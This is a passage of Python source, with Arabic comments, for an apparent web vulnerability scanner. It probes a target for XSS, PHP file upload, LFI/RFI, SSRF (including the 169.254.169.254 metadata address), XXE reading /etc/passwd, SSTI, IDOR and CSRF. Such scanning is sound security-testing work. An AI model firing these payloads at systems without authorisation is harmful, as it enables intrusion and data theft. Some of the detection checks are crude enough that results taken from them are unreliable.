            for payload in rce_payloads:
                if self.delay > 0:
                    time.sleep(self.delay)
                
                test_url = self._build_test_url(param_info['url'], param_info['parameter'], payload)
                response = self._send_request(test_url)
                
                if response:
                    # البحث عن مؤشرات RCE
                    if self._check_rce_indicators(response.text):
                        return {
                            'type': VulnerabilityType.RCE,
                            'severity': SeverityLevel.CRITICAL,
                            'url': test_url,
                            'parameter': param_info['parameter'],
                            'parameter_type': 'URL',
                            'payload': payload,
                            'method': 'GET',
                            'response_code': response.status_code,
                            'details': f"تم اكتشاف RCE في المعلمة '{param_info['parameter']}'",
                            'discovery_time': datetime.now().isoformat(),
                            'vulnerable': True
                        }
            
            return {'vulnerable': False}
        
        except Exception as e:
            if self.verbose:
                print(f"{Color.RED}[-] خطأ في اختبار RCE: {str(e)[:50]}...{Color.RESET}")
            return {'vulnerable': False, 'error': str(e)}
    
    def _check_rce_indicators(self, content):
        """التحقق من مؤشرات RCE"""
        content_lower = content.lower()
        
        for error_pattern in self.rce_errors:
            if re.search(error_pattern, content_lower, re.IGNORECASE):
                return True
        
        # مؤشرات إضافية
        indicators = [
            r'uid=\d+\(.+\) gid=\d+\(.+\)',
            r'root:x:0:0',
        ]
        
        for indicator in indicators:
            if re.search(indicator, content_lower, re.IGNORECASE):
                return True
        
        return False
    
    # ============================================
    # فحص XSS
    # ============================================
    
    def start_xss_scan(self, args=None):
        """بدء فحص XSS متقدم"""
        if not self.target_url:
            return f"{Color.RED}[✗] الرجاء تعيين الهدف أولاً{Color.RESET}"
        
        print(f"{Color.CYAN}{Color.BOLD}[*] بدء فحص Cross-Site Scripting...{Color.RESET}")
        
        vulnerabilities = []
        tested_points = 0
        
        # فحص معاملات URL
        print(f"{Color.YELLOW}[*] فحص معاملات URL لـ XSS...{Color.RESET}")
        for param_info in self.discovered_params[:10]:
            if tested_points >= 20:
                break
            
            result = self._test_xss_injection(param_info)
            tested_points += 1
            
            if result and result.get('vulnerable', False):
                vulnerabilities.append(result)
                self._display_vulnerability(result)
        
        self.scan_results['vulnerabilities'].extend(vulnerabilities)
        self.stats['vulnerabilities_found'] += len(vulnerabilities)
        
        return f"""{Color.GREEN}[✓] تم إكمال فحص XSS{Color.RESET}

{Color.CYAN}الإحصائيات:{Color.RESET}
• النقاط المختبرة: {tested_points}
• الثغرات المكتشفة: {len(vulnerabilities)}"""
    
    def _test_xss_injection(self, param_info):
        """اختبار XSS على معلمة"""
        try:
            xss_payloads = [
                "<script>alert('XSS')</script>",
                "\" onmouseover=\"alert('XSS')\"",
                "<img src=x onerror=alert('XSS')>",
            ]
            
            for payload in xss_payloads:
                if self.delay > 0:
                    time.sleep(self.delay)
                
                test_url = self._build_test_url(param_info['url'], param_info['parameter'], payload)
                response = self._send_request(test_url)
                
                if response:
                    # البحث عن الحمولة في الاستجابة
                    if payload in response.text:
                        return {
                            'type': VulnerabilityType.XSS_REFLECTED,
                            'severity': SeverityLevel.HIGH,
                            'url': test_url,
                            'parameter': param_info['parameter'],
                            'parameter_type': 'URL',
                            'payload': payload,
                            'method': 'GET',
                            'response_code': response.status_code,
                            'details': f"تم اكتشاف XSS في المعلمة '{param_info['parameter']}'",
                            'discovery_time': datetime.now().isoformat(),
                            'vulnerable': True
                        }
            
            return {'vulnerable': False}
        
        except Exception as e:
            if self.verbose:
                print(f"{Color.RED}[-] خطأ في اختبار XSS: {str(e)[:50]}...{Color.RESET}")
            return {'vulnerable': False, 'error': str(e)}
    
    # ============================================
    # فحص رفع الملفات
    # ============================================
    
    def start_upload_scan(self, args=None):
        """بدء فحص رفع الملفات متقدم"""
        if not self.target_url:
            return f"{Color.RED}[✗] الرجاء تعيين الهدف أولاً{Color.RESET}"
        
        print(f"{Color.CYAN}{Color.BOLD}[*] بدء فحص ثغرات رفع الملفات...{Color.RESET}")
        
        vulnerabilities = []
        
        # البحث عن نماذج رفع الملفات
        print(f"{Color.YELLOW}[*] البحث عن نماذج رفع الملفات...{Color.RESET}")
        
        for form in self.discovered_forms:
            for field in form['fields']:
                if field['type'] == 'file':
                    result = self._test_upload_vulnerability(form)
                    if result and result.get('vulnerable', False):
                        vulnerabilities.append(result)
                        self._display_vulnerability(result)
                    break
        
        self.scan_results['vulnerabilities'].extend(vulnerabilities)
        self.stats['vulnerabilities_found'] += len(vulnerabilities)
        
        return f"""{Color.GREEN}[✓] تم إكمال فحص رفع الملفات{Color.RESET}

{Color.CYAN}الإحصائيات:{Color.RESET}
• الثغرات المكتشفة: {len(vulnerabilities)}"""
    
    def _test_upload_vulnerability(self, form):
        """اختبار ثغرة رفع الملفات"""
        try:
            # اختبار حمولة PHP
            filename = "test.php"
            content = b"<?php echo 'VULNERABLE'; ?>"
            
            # تحضير البيانات والملفات
            files = {}
            data = {}
            
            for field in form['fields']:
                if field['type'] == 'file':
                    files[field['name']] = (filename, content, "application/x-php")
                elif field['type'] not in ['submit', 'button']:
                    data[field['name']] = 'test'
            
            # إرسال الطلب
            response = self.session.post(
                form['action'],
                data=data,
                files=files,
                timeout=self.timeout,
                allow_redirects=self.follow_redirects
            )
            
            self.stats['total_requests'] += 1
            
            # التحقق من نجاح الرفع
            if response.status_code in [200, 201, 202]:
                return {
                    'type': VulnerabilityType.FILE_UPLOAD,
                    'severity': SeverityLevel.CRITICAL,
                    'url': form['action'],
                    'parameter': 'file_upload',
                    'parameter_type': 'UPLOAD',
                    'payload': filename,
                    'method': form['method'],
                    'response_code': response.status_code,
                    'details': f"ثغرة رفع ملفات محتملة - تم قبول {filename}",
                    'discovery_time': datetime.now().isoformat(),
                    'vulnerable': True
                }
            
            return {'vulnerable': False}
        
        except Exception as e:
            if self.verbose:
                print(f"{Color.RED}[-] خطأ في اختبار رفع الملفات: {str(e)[:50]}...{Color.RESET}")
            return {'vulnerable': False, 'error': str(e)}
    
    # ============================================
    # فحص LFI/RFI
    # ============================================
    
    def start_lfi_scan(self, args=None):
        """بدء فحص LFI"""
        return self._start_file_inclusion_scan('LFI')
    
    def start_rfi_scan(self, args=None):
        """بدء فحص RFI"""
        return self._start_file_inclusion_scan('RFI')
    
    def _start_file_inclusion_scan(self, scan_type):
        """فحص شامل لثغرات تضمين الملفات"""
        if not self.target_url:
            return f"{Color.RED}[✗] الرجاء تعيين الهدف أولاً{Color.RESET}"
        
        print(f"{Color.CYAN}{Color.BOLD}[*] بدء فحص {scan_type}...{Color.RESET}")
        
        vulnerabilities = []
        tested_points = 0
        
        # اختيار الحمولات المناسبة
        if scan_type == 'LFI':
            payloads = self.lfi_payloads[:5]
            vuln_type = VulnerabilityType.LFI
        else:
            payloads = self.rfi_payloads[:3]
            vuln_type = VulnerabilityType.RFI
        
        print(f"{Color.YELLOW}[*] فحص معاملات URL لـ {scan_type}...{Color.RESET}")
        for param_info in self.discovered_params[:10]:
            if tested_points >= 20:
                break
            
            result = self._test_file_inclusion(param_info, payloads, vuln_type, scan_type)
            tested_points += 1
            
            if result and result.get('vulnerable', False):
                vulnerabilities.append(result)
                self._display_vulnerability(result)
        
        self.scan_results['vulnerabilities'].extend(vulnerabilities)
        self.stats['vulnerabilities_found'] += len(vulnerabilities)
        
        return f"""{Color.GREEN}[✓] تم إكمال فحص {scan_type}{Color.RESET}

{Color.CYAN}الإحصائيات:{Color.RESET}
• النقاط المختبرة: {tested_points}
• الثغرات المكتشفة: {len(vulnerabilities)}"""
    
    def _test_file_inclusion(self, param_info, payloads, vuln_type, scan_type):
        """اختبار تضمين الملفات"""
        try:
            for payload in payloads:
                if self.delay > 0:
                    time.sleep(self.delay)
                
                test_url = self._build_test_url(param_info['url'], param_info['parameter'], payload)
                response = self._send_request(test_url)
                
                if response:
                    # التحقق من المؤشرات
                    if scan_type == 'LFI':
                        if self._check_lfi_indicators(response.text):
                            return {
                                'type': vuln_type,
                                'severity': SeverityLevel.HIGH,
                                'url': test_url,
                                'parameter': param_info['parameter'],
                                'parameter_type': 'URL',
                                'payload': payload,
                                'method': 'GET',
                                'response_code': response.status_code,
                                'details': f"تم اكتشاف {scan_type} في المعلمة '{param_info['parameter']}'",
                                'discovery_time': datetime.now().isoformat(),
                                'vulnerable': True
                            }
                    else:  # RFI
                        if self._check_rfi_indicators(response.text):
                            return {
                                'type': vuln_type,
                                'severity': SeverityLevel.CRITICAL,
                                'url': test_url,
                                'parameter': param_info['parameter'],
                                'parameter_type': 'URL',
                                'payload': payload,
                                'method': 'GET',
                                'response_code': response.status_code,
                                'details': f"تم اكتشاف {scan_type} في المعلمة '{param_info['parameter']}'",
                                'discovery_time': datetime.now().isoformat(),
                                'vulnerable': True
                            }
            
            return {'vulnerable': False}
        
        except Exception as e:
            if self.verbose:
                print(f"{Color.RED}[-] خطأ في اختبار {scan_type}: {str(e)[:50]}...{Color.RESET}")
            return {'vulnerable': False, 'error': str(e)}
    
    # ============================================
    # إضافة الدوال المفقودة
    # ============================================
    
    def start_ssrf_scan(self, args=None):
        """بدء فحص SSRF"""
        if not self.target_url:
            return f"{Color.RED}[✗] الرجاء تعيين الهدف أولاً{Color.RESET}"
        
        print(f"{Color.CYAN}{Color.BOLD}[*] بدء فحص Server-Side Request Forgery...{Color.RESET}")
        
        vulnerabilities = []
        tested_points = 0
        
        print(f"{Color.YELLOW}[*] فحص معاملات URL لـ SSRF...{Color.RESET}")
        for param_info in self.discovered_params[:5]:
            if tested_points >= 10:
                break
            
            # اختبار SSRF فقط على المعاملات التي تبدو كروابط
            if any(keyword in param_info['parameter'].lower() for keyword in ['url', 'link', 'image', 'src', 'path']):
                result = self._test_ssrf(param_info)
                tested_points += 1
                
                if result and result.get('vulnerable', False):
                    vulnerabilities.append(result)
                    self._display_vulnerability(result)
        
        self.scan_results['vulnerabilities'].extend(vulnerabilities)
        self.stats['vulnerabilities_found'] += len(vulnerabilities)
        
        return f"""{Color.GREEN}[✓] تم إكمال فحص SSRF{Color.RESET}

{Color.CYAN}الإحصائيات:{Color.RESET}
• النقاط المختبرة: {tested_points}
• الثغرات المكتشفة: {len(vulnerabilities)}"""
    
    def _test_ssrf(self, param_info):
        """اختبار SSRF"""
        try:
            ssrf_payloads = [
                "http://localhost",
                "http://127.0.0.1",
                "http://169.254.169.254/latest/meta-data/",
            ]
            
            for payload in ssrf_payloads:
                if self.delay > 0:
                    time.sleep(self.delay)
                
                test_url = self._build_test_url(param_info['url'], param_info['parameter'], payload)
                response = self._send_request(test_url)
                
                if response:
                    # البحث عن مؤشرات SSRF
                    indicators = [
                        'localhost', '127.0.0.1', 'internal',
                        'metadata', 'aws', 'cloud'
                    ]
                    
                    for indicator in indicators:
                        if indicator in response.text.lower():
                            return {
                                'type': VulnerabilityType.SSRF,
                                'severity': SeverityLevel.HIGH,
                                'url': test_url,
                                'parameter': param_info['parameter'],
                                'parameter_type': 'URL',
                                'payload': payload,
                                'method': 'GET',
                                'response_code': response.status_code,
                                'details': f"تم اكتشاف SSRF في المعلمة '{param_info['parameter']}'",
                                'discovery_time': datetime.now().isoformat(),
                                'vulnerable': True
                            }
            
            return {'vulnerable': False}
        
        except Exception as e:
            if self.verbose:
                print(f"{Color.RED}[-] خطأ في اختبار SSRF: {str(e)[:50]}...{Color.RESET}")
            return {'vulnerable': False, 'error': str(e)}
    
    def start_xxe_scan(self, args=None):
        """بدء فحص XXE"""
        if not self.target_url:
            return f"{Color.RED}[✗] الرجاء تعيين الهدف أولاً{Color.RESET}"
        
        print(f"{Color.CYAN}{Color.BOLD}[*] بدء فحص XML External Entity...{Color.RESET}")
        
        vulnerabilities = []
        
        # اختبار النماذج التي قد تقبل XML
        for form in self.discovered_forms:
            if form['action'].lower().endswith('.xml') or 'xml' in form['action'].lower():
                result = self._test_xxe_form(form)
                if result and result.get('vulnerable', False):
                    vulnerabilities.append(result)
                    self._display_vulnerability(result)
        
        self.scan_results['vulnerabilities'].extend(vulnerabilities)
        self.stats['vulnerabilities_found'] += len(vulnerabilities)
        
        return f"""{Color.GREEN}[✓] تم إكمال فحص XXE{Color.RESET}

{Color.CYAN}الإحصائيات:{Color.RESET}
• الثغرات المكتشفة: {len(vulnerabilities)}"""
    
    def _test_xxe_form(self, form):
        """اختبار XXE على نموذج"""
        try:
            xxe_payload = '''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>'''
            
            if self.delay > 0:
                time.sleep(self.delay)
            
            # إرسال طلب XML
            headers = {'Content-Type': 'application/xml'}
            response = self.session.post(
                form['action'],
                data=xxe_payload,
                headers=headers,
                timeout=self.timeout,
                allow_redirects=self.follow_redirects
            )
            
            self.stats['total_requests'] += 1
            
            # البحث عن مؤشرات XXE
            if self._check_xxe_indicators(response.text):
                return {
                    'type': VulnerabilityType.XXE,
                    'severity': SeverityLevel.CRITICAL,
                    'url': form['action'],
                    'parameter': 'XML Body',
                    'parameter_type': 'XML',
                    'payload': xxe_payload[:100] + '...',
                    'method': 'POST',
                    'response_code': response.status_code,
                    'details': f"تم اكتشاف XXE في النموذج '{form['action']}'",
                    'discovery_time': datetime.now().isoformat(),
                    'vulnerable': True
                }
            
            return {'vulnerable': False}
        
        except Exception as e:
            if self.verbose:
                print(f"{Color.RED}[-] خطأ في اختبار XXE: {str(e)[:50]}...{Color.RESET}")
            return {'vulnerable': False, 'error': str(e)}
    
    def start_idor_scan(self, args=None):
        """بدء فحص IDOR"""
        if not self.target_url:
            return f"{Color.RED}[✗] الرجاء تعيين الهدف أولاً{Color.RESET}"
        
        print(f"{Color.CYAN}{Color.BOLD}[*] بدء فحص Insecure Direct Object References...{Color.RESET}")
        
        vulnerabilities = []
        
        # البحث عن معاملات ID في URLs
        print(f"{Color.YELLOW}[*] البحث عن معاملات ID...{Color.RESET}")
        id_params = []
        
        for param_info in self.discovered_params:
            param_lower = param_info['parameter'].lower()
            if any(keyword in param_lower for keyword in ['id', 'user', 'account', 'doc', 'file', 'num']):
                id_params.append(param_info)
        
        print(f"{Color.YELLOW}[*] العثور على {len(id_params)} معلمة ID محتملة{Color.RESET}")
        
        # اختبار معاملات ID
        for param_info in id_params[:5]:
            result = self._test_idor(param_info)
            if result and result.get('vulnerable', False):
                vulnerabilities.append(result)
                self._display_vulnerability(result)
        
        self.scan_results['vulnerabilities'].extend(vulnerabilities)
        self.stats['vulnerabilities_found'] += len(vulnerabilities)
        
        return f"""{Color.GREEN}[✓] تم إكمال فحص IDOR{Color.RESET}

{Color.CYAN}الإحصائيات:{Color.RESET}
• المعاملات المختبرة: {len(id_params[:5])}
• الثغرات المكتشفة: {len(vulnerabilities)}"""
    
    def _test_idor(self, param_info):
        """اختبار IDOR"""
        try:
            # تغيير قيمة ID
            original_value = param_info.get('value', '1')
            
            if original_value.isdigit():
                new_value = str(int(original_value) + 100)  # تغيير كبير
            else:
                new_value = 'admin'  # قيمة افتراضية
                
            test_url = self._build_test_url(param_info['url'], param_info['parameter'], new_value)
            response = self._send_request(test_url)
            
            if response and response.status_code == 200:
                return {
                    'type': VulnerabilityType.IDOR,
                    'severity': SeverityLevel.MEDIUM,
                    'url': test_url,
                    'parameter': param_info['parameter'],
                    'parameter_type': 'URL',
                    'payload': new_value,
                    'method': 'GET',
                    'response_code': response.status_code,
                    'details': f"تم اكتشاف IDOR في المعلمة '{param_info['parameter']}' - الوصول إلى بيانات أخرى محتمل",
                    'discovery_time': datetime.now().isoformat(),
                    'vulnerable': True
                }
            
            return {'vulnerable': False}
        
        except Exception as e:
            if self.verbose:
                print(f"{Color.RED}[-] خطأ في اختبار IDOR: {str(e)[:50]}...{Color.RESET}")
            return {'vulnerable': False, 'error': str(e)}
    
    def start_csrf_scan(self, args=None):
        """بدء فحص CSRF"""
        if not self.target_url:
            return f"{Color.RED}[✗] الرجاء تعيين الهدف أولاً{Color.RESET}"
        
        print(f"{Color.CYAN}{Color.BOLD}[*] بدء فحص Cross-Site Request Forgery...{Color.RESET}")
        
        vulnerabilities = []
        
        # البحث عن النماذج الحساسة
        print(f"{Color.YELLOW}[*] البحث عن النماذج الحساسة...{Color.RESET}")
        sensitive_forms = []
        
        for form in self.discovered_forms:
            form_action = form['action'].lower()
            if any(action in form_action for action in ['delete', 'update', 'edit', 'add', 'create', 'changepass']):
                sensitive_forms.append(form)
        
        print(f"{Color.YELLOW}[*] العثور على {len(sensitive_forms)} نموذج حساس{Color.RESET}")
        
        # اختبار النماذج الحساسة لوجود حماية CSRF
        for form in sensitive_forms[:3]:
            result = self._test_csrf_protection(form)
            if result and result.get('vulnerable', False):
                vulnerabilities.append(result)
                self._display_vulnerability(result)
        
        self.scan_results['vulnerabilities'].extend(vulnerabilities)
        self.stats['vulnerabilities_found'] += len(vulnerabilities)
        
        return f"""{Color.GREEN}[✓] تم إكمال فحص CSRF{Color.RESET}

{Color.CYAN}الإحصائيات:{Color.RESET}
• النماذج المختبرة: {len(sensitive_forms[:3])}
• الثغرات المكتشفة: {len(vulnerabilities)}"""
    
    def _test_csrf_protection(self, form):
        """اختبار حماية CSRF"""
        try:
            # البحث عن توكنات CSRF في النموذج
            has_csrf_token = False
            csrf_fields = ['csrf', 'token', 'authenticity', '_token', 'nonce']
            
            for field in form['fields']:
                field_name = field['name'].lower()
                if any(csrf_field in field_name for csrf_field in csrf_fields):
                    has_csrf_token = True
                    break
            
            if not has_csrf_token:
                return {
                    'type': VulnerabilityType.CSRF,
                    'severity': SeverityLevel.MEDIUM,
                    'url': form['action'],
                    'parameter': 'CSRF Protection',
                    'parameter_type': 'FORM',
                    'payload': 'Missing CSRF token',
                    'method': form['method'],
                    'response_code': 200,
                    'details': f"نموذج حساس '{form['action']}' لا يحتوي على حماية CSRF",
                    'discovery_time': datetime.now().isoformat(),
                    'vulnerable': True
                }
            
            return {'vulnerable': False}
        
        except Exception as e:
            if self.verbose:
                print(f"{Color.RED}[-] خطأ في اختبار CSRF: {str(e)[:50]}...{Color.RESET}")
            return {'vulnerable': False, 'error': str(e)}
    
    def start_ssti_scan(self, args=None):
        """بدء فحص SSTI"""
        if not self.target_url:
            return f"{Color.RED}[✗] الرجاء تعيين الهدف أولاً{Color.RESET}"
        
        print(f"{Color.CYAN}{Color.BOLD}[*] بدء فحص Server-Side Template Injection...{Color.RESET}")
        
        vulnerabilities = []
        tested_points = 0
        
        print(f"{Color.YELLOW}[*] فحص معاملات URL لـ SSTI...{Color.RESET}")
        for param_info in self.discovered_params[:10]:
            if tested_points >= 20:
                break
            
            result = self._test_ssti(param_info)
            tested_points += 1
            
            if result and result.get('vulnerable', False):
                vulnerabilities.append(result)
                self._display_vulnerability(result)
        
        self.scan_results['vulnerabilities'].extend(vulnerabilities)
        self.stats['vulnerabilities_found'] += len(vulnerabilities)
        
        return f"""{Color.GREEN}[✓] تم إكمال فحص SSTI{Color.RESET}

{Color.CYAN}الإحصائيات:{Color.RESET}
• النقاط المختبرة: {tested_points}
• الثغرات المكتشفة: {len(vulnerabilities)}"""
    
    def _test_ssti(self, param_info):
        """اختبار SSTI"""
        try:
            ssti_payloads = [
                "${7*7}",
                "{{7*7}}",
                "<%= 7*7 %>",
            ]
            
            for payload in ssti_payloads:
                if self.delay > 0:
                    time.sleep(self.delay)
                
                test_url = self._build_test_url(param_info['url'], param_info['parameter'], payload)
                response = self._send_request(test_url)
                
                if response:
                    # البحث عن نتيجة الحساب في الاستجابة
                    if '49' in response.text:  # 7*7=49
                        return {
                            'type': VulnerabilityType.SSTI,
                            'severity': SeverityLevel.CRITICAL,
                            'url': test_url,
                            'parameter': param_info['parameter'],
                            'parameter_type': 'URL',
                            'payload': payload,
                            'method': 'GET',
                            'response_code': response.status_code,
                            'details': f"تم اكتشاف SSTI في المعلمة '{param_info['parameter']}' - تنفيذ تعبير قالب",
                            'discovery_time': datetime.now().isoformat(),
                            'vulnerable': True
                        }
            
            return {'vulnerable': False}
        
        except Exception as e:
            if self.verbose:
                print(f"{Color.RED}[-] خطأ في اختبار SSTI: {str(e)[:50]}...{Color.RESET}")
            return {'vulnerable': False, 'error': str(e)}
    
    # ============================================
    # المسح الشامل - الدالة المصححة
    # ============================================
    
    def start_full_scan(self, args=None):
        """بدء مسح شامل لجميع الثغرات - مصححة"""
        if not self.target_url:
            return f"{Color.RED}[✗] الرجاء تعيين الهدف أولاً{Color.RESET}"
        
        print(f"{Color.CYAN}{Color.BOLD}")
        print("╔══════════════════════════════════════════════════════════════╗")
        print("║                بدء المسح الشامل - DrmnefWebScanner           ║")
        print(f"║                الهدف: {self.target_url:<35} ║")
        print("╚══════════════════════════════════════════════════════════════╝")
        print(Color.RESET)
        
        self.stats['start_time'] = time.time()
        
        # قائمة الفحوصات حسب الأولوية
        scan_steps = [
            ("اختبار الاتصال", lambda: self.test_connection()),
            ("زحف الموقع", lambda: self.crawl_for_parameters()),
            ("فحص SQL Injection", lambda: self.start_sql_scan()),
            ("فحص RCE", lambda: self.start_rce_scan()),
            ("فحص XSS", lambda: self.start_xss_scan()),
            ("فحص رفع الملفات", lambda: self.start_upload_scan()),
            ("فحص LFI", lambda: self.start_lfi_scan()),
            ("فحص RFI", lambda: self.start_rfi_scan()),
            ("فحص SSRF", lambda: self.start_ssrf_scan()),
            ("فحص XXE", lambda: self.start_xxe_scan()),
            ("فحص IDOR", lambda: self.start_idor_scan()),
            ("فحص CSRF", lambda: self.start_csrf_scan()),
            ("فحص SSTI", lambda: self.start_ssti_scan()),
        ]
        
        results_summary = []
        
        for i, (step_name, step_function) in enumerate(scan_steps, 1):
            print(f"\n{Color.YELLOW}[{i}/{len(scan_steps)}] {step_name}...{Color.RESET}")
            try:
                result = step_function()
                if result:
                    results_summary.append(f"{step_name}: {result}")
            except KeyboardInterrupt:
                print(f"\n{Color.RED}[!] تم إيقاف الفحص بواسطة المستخدم{Color.RESET}")
                break
            except Exception as e:
                print(f"{Color.RED}[✗] خطأ في {step_name}: {str(e)[:50]}...{Color.RESET}")
                if self.verbose:
                    import traceback
                    traceback.print_exc()
        
        self.stats['end_time'] = time.time()
        elapsed_time = self.stats['end_time'] - self.stats['start_time']
        self.scan_results['scan_duration'] = elapsed_time
        
        # عرض ملخص النتائج
        total_vulns = len(self.scan_results.get('vulnerabilities', []))
        
        summary = f"""
{Color.GREEN}{Color.BOLD}
╔══════════════════════════════════════════════════════════════╗
║                تم إكمال المسح الشامل                        ║
╚══════════════════════════════════════════════════════════════╝{Color.RESET}

{Color.CYAN}📊 ملخص النتائج:{Color.RESET}
• الثغرات المكتشفة: {total_vulns}
• الثغرات الحرجة: {self.stats['critical_count']}
• الثغرات العالية: {self.stats['high_count']}
• الثغرات المتوسطة: {self.stats['medium_count']}
• الثغرات المنخفضة: {self.stats['low_count']}

{Color.CYAN}⏱️  وقت التنفيذ:{Color.RESET} {elapsed_time:.2f} ثانية
{Color.CYAN}📊 عدد الطلبات:{Color.RESET} {self.stats['total_requests']:,}
{Color.CYAN}🎯 النقاط المكتشفة:{Color.RESET} {len(self.discovered_params)} معلمة، {len(self.discovered_forms)} نموذج

{Color.YELLOW}💡 استخدم 'show results' لعرض النتائج التفصيلية{Color.RESET}
{Color.YELLOW}💾 استخدم 'export html' لإنشاء تقرير HTML{Color.RESET}
"""
        
        print(summary)
        return f"{Color.GREEN}[✓] تم إكمال المسح الشامل بنجاح{Color.RESET}"
    
    def advanced_scan(self, args=None):
        """مسح متقدم - يشمل الثغرات الأكثر خطورة فقط"""
        print(f"{Color.CYAN}{Color.BOLD}[*] بدء المسح المتقدم (التركيز على الثغرات الحرجة)...{Color.RESET}")
        
        # الفحوصات الحرجة فقط
        critical_scans = [
            ("فحص SQL Injection", lambda: self.start_sql_scan()),
            ("فحص RCE", lambda: self.start_rce_scan()),
            ("فحص رفع الملفات", lambda: self.start_upload_scan()),
        ]
        
        for scan_name, scan_func in critical_scans:
            print(f"\n{Color.YELLOW}[*] {scan_name}...{Color.RESET}")
            try:
                result = scan_func()
                print(result)
            except Exception as e:
                print(f"{Color.RED}[✗] خطأ في {scan_name}: {str(e)[:50]}...{Color.RESET}")
        
        return f"{Color.GREEN}[✓] تم إكمال المسح المتقدم{Color.RESET}"
    
    def deep_scan(self, args=None):
        """مسح عميق وشامل مع زيادة الإعدادات"""
        print(f"{Color.CYAN}{Color.BOLD}[*] بدء المسح العميق (إعدادات متقدمة)...{Color.RESET}")
        
        # حفظ الإعدادات الأصلية
        original_threads = self.threads
        original_depth = self.scan_depth
        original_max_requests = self.max_requests
        
        # زيادة الإعدادات للفحص العميق
        self.threads = min(50, original_threads * 2)
        self.scan_depth = min(5, original_depth + 2)
        self.max_requests = min(2000, original_max_requests * 2)
        
        print(f"{Color.YELLOW}[*] الإعدادات الجديدة: Threads={self.threads}, Depth={self.scan_depth}, MaxRequests={self.max_requests}{Color.RESET}")
        
        # تنفيذ المسح الشامل
        result = self.start_full_scan()
        
        # استعادة الإعدادات الأصلية
        self.threads = original_threads
        self.scan_depth = original_depth
        self.max_requests = original_max_requests
        
        return f"{Color.GREEN}[✓] تم إكمال المسح العميق{Color.RESET}"
    
    # ============================================
    # وظائف مساعدة
    # ============================================
    
    def _build_test_url(self, url, parameter, payload):
        """بناء URL للاختبار"""
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        
        query_params[parameter] = [payload]
        new_query = '&'.join([f"{k}={quote(v[0]) if v else ''}" for k, v in query_params.items()])
        
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
    
    def _send_request(self, url):
        """إرسال طلب مع التعامل مع الأخطاء"""
        try:
            if self.delay > 0:
                time.sleep(self.delay)
            
            response = self.session.get(
                url,
                timeout=self.timeout,
                allow_redirects=self.follow_redirects
            )
            
            self.stats['total_requests'] += 1
            return response
        
        except Exception as e:
            if self.verbose:
                print(f"{Color.RED}[-] خطأ في الطلب إلى {url}: {str(e)[:50]}...{Color.RESET}")
            return None
    
    def _check_sql_errors(self, content):
        """التحقق من أخطاء SQL"""
        content_lower = content.lower()
        
        for error_pattern in self.sql_errors:
            if re.search(error_pattern, content_lower, re.IGNORECASE):
                return True
        
        return False
    
    def _check_lfi_indicators(self, content):
        """التحقق من مؤشرات LFI"""
        content_lower = content.lower()
        
        for error_pattern in self.lfi_errors:
            if re.search(error_pattern, content_lower, re.IGNORECASE):
                return True
        
        # مؤشرات محتوى الملفات
        indicators = [
            r'root:x:0:0',
            r'daemon:x:1:1',
        ]
        
        for indicator in indicators:
            if re.search(indicator, content, re.IGNORECASE):
                return True
        
        return False
    
    def _check_rfi_indicators(self, content):
        """التحقق من مؤشرات RFI"""
        content_lower = content.lower()
        
        for error_pattern in self.rfi_errors:
            if re.search(error_pattern, content_lower, re.IGNORECASE):
                return True
        
        return False
    
    def _check_xxe_indicators(self, content):
        """التحقق من مؤشرات XXE"""
        content_lower = content.lower()
        
        for error_pattern in self.xxe_errors:
            if re.search(error_pattern, content_lower, re.IGNORECASE):
                return True
        
        # مؤشرات محتوى الملفات في XML
        if 'root:x:' in content or 'daemon:x:' in content:
            return True
        
        return False
    
    def _display_vulnerability(self, vulnerability):
        """عرض الثغرة المكتشفة"""
        color_map = {
            SeverityLevel.CRITICAL: Color.RED,
            SeverityLevel.HIGH: Color.RED,
            SeverityLevel.MEDIUM: Color.YELLOW,
            SeverityLevel.LOW: Color.CYAN,
            SeverityLevel.INFO: Color.BLUE
        }
        
        color = color_map.get(vulnerability['severity'], Color.WHITE)
        
        print(f"""
{color}{'═' * 60}{Color.RESET}
{color}{Color.BOLD}[!] {vulnerability['severity']} - {vulnerability['type']}{Color.RESET}
{color}{'─' * 60}{Color.RESET}
{Color.CYAN}🔗 الرابط:{Color.RESET} {vulnerability['url']}
{Color.CYAN}📌 المعلمة:{Color.RESET} {vulnerability['parameter']}
{Color.CYAN}💣 الحمولة:{Color.RESET} {vulnerability['payload'][:50]}{'...' if len(vulnerability['payload']) > 50 else ''}
{Color.CYAN}📝 التفاصيل:{Color.RESET} {vulnerability['details']}
{color}{'═' * 60}{Color.RESET}
        """)
    
    # ============================================
    # عرض النتائج
    # ============================================
    
    def show_results(self, args):
        """عرض نتائج الفحص"""
        if not args:
            args = ["summary"]
        
        result_type = args[0].lower()
        
        if result_type in ["vulnerabilities", "all", "summary"]:
            return self._show_all_vulnerabilities()
        
        elif result_type == "critical":
            return self._show_critical_vulnerabilities()
        
        elif result_type == "high":
            return self._show_high_vulnerabilities()
        
        elif result_type == "details" and len(args) > 1:
            try:
                vuln_id = int(args[1]) - 1
                return self._show_vulnerability_details(vuln_id)
            except (ValueError, IndexError):
                return f"{Color.RED}[✗] رقم الثغرة غير صحيح{Color.RESET}"
        
        elif result_type == "endpoints":
            return self._show_discovered_endpoints()
        
        elif result_type == "stats":
            return self.show_stats()
        
        else:
            return f"{Color.RED}[✗] نوع العرض غير معروف{Color.RESET}"
    
    def _show_all_vulnerabilities(self):
        """عرض جميع الثغرات"""
        vulnerabilities = self.scan_results.get('vulnerabilities', [])
        
        if not vulnerabilities:
            return f"{Color.YELLOW}[ℹ] لم يتم اكتشاف أي ثغرات{Color.RESET}"
        
        output = f"{Color.CYAN}{Color.BOLD}╔══════════════════════════════════════════════════════════════╗\n"
        output += f"║            جميع الثغرات ({len(vulnerabilities)})             ║\n"
        output += f"╚══════════════════════════════════════════════════════════════╝{Color.RESET}\n\n"
        
        for i, vuln in enumerate(vulnerabilities, 1):
            severity_color = Color.RED if vuln['severity'] in [SeverityLevel.CRITICAL, SeverityLevel.HIGH] else Color.YELLOW
            output += f"  {i}. {severity_color}{vuln['severity']}{Color.RESET} - {vuln['type']}\n"
            output += f"      {vuln['url'][:80]}...\n"
            output += f"      {vuln['details'][:100]}...\n\n"
        
        return output
    
    def _show_critical_vulnerabilities(self):
        """عرض الثغرات الحرجة فقط"""
        critical_vulns = self.scan_results.get('critical_vulnerabilities', [])
        
        if not critical_vulns:
